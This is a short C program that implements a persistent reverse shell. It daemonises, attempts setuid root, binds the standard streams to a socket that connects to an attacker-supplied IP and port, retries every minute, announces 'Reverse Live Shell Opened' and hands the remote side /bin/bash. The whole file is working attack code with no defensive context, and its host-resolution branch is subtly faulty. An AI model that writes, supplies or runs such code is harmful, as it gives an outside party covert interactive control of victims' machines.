
#include <stdlib.h>
#include <unistd.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

struct sockaddr_in attacker={.sin_family=AF_INET,.sin_port=htons(PORT)};
int c;
int main(void){
  if (fork()>0)exit(0);
code:
  struct hostent* host=gethostbyname(IP);
  if (host==0x00)
     inet_pton(AF_INET,IP,&attacker.sin_addr.s_addr);
  else
     attacker.sin_addr.s_addr=*(long*)host->h_name;
  setuid(0);seteuid(0);
  int s=socket(AF_INET, SOCK_STREAM,0);
  for (int fd=0;fd<3;fd++) { close(fd); dup2(s,fd);}
  do {c=connect(s,(struct sockaddr*)&attacker,sizeof(attacker)); sleep(60);}while(c==-1);
  send(s,"☢ Hacked !!Reverse Live Shell Opened !!\n", sizeof("☢ Hacked !!Reverse Live Shell Opened !!\n"),0);
  system("/bin/bash");
  close(s);
  goto code;

}

